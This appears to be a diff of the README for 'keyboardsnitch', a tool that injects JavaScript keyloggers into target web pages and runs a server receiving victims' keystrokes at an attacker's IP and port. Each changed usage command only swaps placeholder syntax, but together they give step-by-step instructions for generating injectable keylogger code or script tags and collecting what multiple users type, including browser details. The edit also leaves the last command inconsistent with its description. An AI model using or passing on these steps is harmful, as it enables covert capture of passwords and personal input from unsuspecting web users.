@@ -37,7 +37,9 @@ __keyboardsnitch__ provides two methods of injecting its keylogging JavaScript c
 
 To generate a keylogger that can be injected directly into the target page, use the following command:
 
-	python keyboardsnitch.py --inject-code --lhost <your ip address or fqdn here> --lport <the port on which to listen for data from the keylogger>
+	# substitute YOUR_IP with your ip address
+	# substitute LISTEN_PORT with the port you want keyboardsnitch to listen on
+	python keyboardsnitch.py --inject-code --lhost YOUR_IP --lport LISTEN_PORT
 
 __keyboardsnitch__ will automatically modify the keylogger's source code to include your ip/domain and port number.
 
@@ -51,7 +53,9 @@ Should you want to inject a script tag instead of raw source code, __keyboardsni
 
 To generate a script tag linking to the keylogger, use the following command:
 
-	python keyboardsnitch.py --inject-tag --lhost <your ip address or fqdn here> --lport <the port on which to listen for data from the keylogger>
+	# substitute YOUR_IP with your ip address
+	# substitute LISTEN_PORT with the port you want keyboardsnitch to listen on
+	python keyboardsnitch.py --inject-tag --lhost YOUR_IP --lport LISTEN_PORT
 
 As with the __WebSockets__ script tag, the generated script tag may require additional configuration or modification.
 
@@ -64,7 +68,9 @@ Example:
 
 Once the keylogger has been injected into the target web page, we start __keyboardsnitch__'s server component to start logging keystrokes.
 
-	python keyboardsnitch.py --lhost <your ip address or fqdn here> --lport <the port on which to listen for data from the keylogger>
+	# substitute YOUR_IP with your ip address
+	# substitute LISTEN_PORT with the port you want keyboardsnitch to listen on
+	python keyboardsnitch.py --lhost YOUR_IP --lport LISTEN_PORT
 
 When a user begins typing into a text field on the target web page, the contents of that text field will be shown in real time. Additionally, information about the text field is displayed so that you can identify what is being typed where.
 
@@ -73,19 +79,27 @@ When a user begins typing into a text field on the target web page, the contents
 
 If you are targeting a page visited by multiple users, use this command:
 
-	python keyboardsnitch.py --lhost <your ip address or fqdn here> --lport <the port on which to listen for data from the keylogger> --clients
+	# substitute YOUR_IP with your ip address
+	# substitute LISTEN_PORT with the port you want keyboardsnitch to listen on
+	python keyboardsnitch.py --clients --lhost YOUR_IP --lport LISTEN_PORT
 
 If you are injecting the keylogger into multiple pages, use this command:
 
-	python keyboardsnitch.py --lhost <your ip address or fqdn here> --lport <the port on which to listen for data from the keylogger> --hosts
+	# substitute YOUR_IP with your ip address
+	# substitute LISTEN_PORT with the port you want keyboardsnitch to listen on
+	python keyboardsnitch.py --hosts --lhost YOUR_IP --lport LISTEN_PORT
 
 If you are injecting the keylogger into multiple pages and expect those pages to be visited by multiple users, use this command:
 
-	python keyboardsnitch.py --lhost <your ip address or fqdn here> --lport <the port on which to listen for data from the keylogger> --clients --hosts
+	# substitute YOUR_IP with your ip address
+	# substitute LISTEN_PORT with the port you want keyboardsnitch to listen on
+	python keyboardsnitch.py --clients --hosts --lhost YOUR_IP --lport LISTEN_PORT
 
 If you want information about users' web browsers, use the --user-agents flag along with whatever other flags you choose to include:
 
-	python keyboardsnitch.py --lhost <your ip address or fqdn here> --lport <the port on which to listen for data from the keylogger> --clients --hosts --user-agents
+	# substitute YOUR_IP with your ip address
+	# substitute LISTEN_PORT with the port you want keyboardsnitch to listen on
+	python keyboardsnitch.py --user-agents --lhost YOUR_IP --lport LISTEN_PORT
 
 #Interactive Mode
 
